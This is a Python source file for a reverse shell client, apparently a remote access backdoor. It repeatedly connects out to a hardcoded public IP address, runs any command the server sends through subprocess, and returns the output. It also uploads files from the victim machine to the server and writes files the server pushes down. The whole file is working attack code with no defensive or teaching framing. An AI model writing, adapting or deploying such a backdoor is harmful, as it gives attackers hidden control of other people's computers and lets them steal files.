import socket
import time
import os
import subprocess
import cython

HEADER = 400
PORT_SHELL = 887
PORT_FILE = 888
SERVER = "127.0.0.1"
SERVER = "46.101.213.187"
FORMAT = "utf-8"
DISCONNECT_MESSAGE = "!DISCONNECT"
ADDR_SHELL = (SERVER, PORT_SHELL)
ADDR_FILE = (SERVER, PORT_FILE)
running = True


def format_size(size: int):
    # formats the size in bytes into more human-readable format
    if size == 0:
        return "0B"
    size_fixed = size
    unit_index = 0
    units = ["B", "KB", "MB", "GB", "TB"]
    while size_fixed > 512 and unit_index < 5:
        unit_index += 1
        size_fixed = size/1024**unit_index
    return str(round(size_fixed, 2)) + units[unit_index]


def send(conn, msg):
    msg_encoded = msg.encode(FORMAT)
    if len(msg_encoded) > 1000:
        send_large_response(msg, conn)
        return
    msg_len = len(msg_encoded)
    msg_len_encoded = str(msg_len).encode(FORMAT)
    msg_len_encoded += b" " * (HEADER - len(str(msg_len)))
    try:
        conn.send(msg_len_encoded)
        conn.send(msg_encoded)
    except:
        raise
    print(msg_encoded.decode(FORMAT))


def send_large_response(msg, conn):
    send(conn, "LARGE_RESPONSE")
    buffer = msg.encode(FORMAT)[:1024]
    cursor = 1024
    while buffer:
        conn.send(buffer)
        print(buffer)
        buffer = msg[cursor:cursor+1024].encode(FORMAT)
        cursor += 1024


def receive(conn):
    try:
        msg_len = conn.recv(HEADER).decode(FORMAT)
    except socket.timeout:
        raise socket.timeout()
    except:
        raise socket.timeout()
    if msg_len == " ": return ""
    if not msg_len: return ""
    msg_len = int(msg_len)
    if msg_len == 0: return ""
    msg = conn.recv(msg_len).decode(FORMAT)
    if msg.startswith("LARGE_RESPONSE"):
        msg = receive_large_response(conn)
    return msg


def receive_large_response(conn):
    recv_buffer = conn.recv(1024)
    msg = b""
    while recv_buffer:
        msg += recv_buffer
        recv_buffer = conn.recv(1024)
    return msg.decode(FORMAT)


def connect(addr):
    while running:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            client.connect(addr)
            client.settimeout(5)
            return client
        except:
            time.sleep(10)


def send_file(path):
    conn = connect(ADDR_FILE)
    send(conn, path)
    with open("\\".join((os.getcwd(), path)), "rb") as f:
        buffer = f.read(1024)
        while buffer:
            conn.send(buffer)
            buffer = f.read(1024)


def recv_file(conn):
    filename = receive(conn)
    with open("\\".join((os.getcwd(), filename)), "wb") as f:
        recv_buffer = conn.recv(1024)
        while recv_buffer:
            f.write(recv_buffer)
            recv_buffer = conn.recv(1024)
        conn.close()


def is_still_connected(sock):
    try:
        sock.send(b"")
    except:
        return False
    return True


def main():
    while True:
        server_conn = connect(ADDR_SHELL)
        server_conn.settimeout(5)
        while True:
            command = ""
            output = ""
            if not is_still_connected(server_conn):
                print("abc")
                break
            try:
                command = receive(server_conn)
            except socket.timeout:
                continue
            if command == "":
                # this happens if the server is stopped
                break
            elif command == "disconnect":
                continue
            split_command = command.split()
            if command.lower() == "exit":
                # if the command is exit, just break out of the loop
                break
            elif command.lower() == "stop":
                break
            elif command.lower().strip() == "cd":
                send(server_conn, os.getcwd())
                continue
            elif split_command[0].lower() == "cd":
                # cd command, change directory
                try:
                    os.chdir(' '.join(split_command[1:]))
                except:
                    # if there is an error, set as the output
                    output = "directory not found"
                else:
                    # if operation is successful, empty message
                    output = ""
            elif split_command[0] == "getfile":
                send_file(" ".join(split_command[1:]))
                continue
            elif split_command[0] == "dir":
                send(server_conn, "\n".join((x + " | " + format_size(os.path.getsize(x))) for x in os.listdir(os.getcwd())))
                continue
            elif command[0] == "sendfile":
                recv_file(server_conn)
            elif command == "exit":
                send(server_conn, DISCONNECT_MESSAGE)
                exit()
            # execute the command and retrieve the results
            if output == "": output = subprocess.getoutput(command)
            # send the results back to the server
            try:
                send(server_conn, output)
            except:
                break
        if command == "exit":
            break
        server_conn.close()


if __name__ == "__main__":
    main()
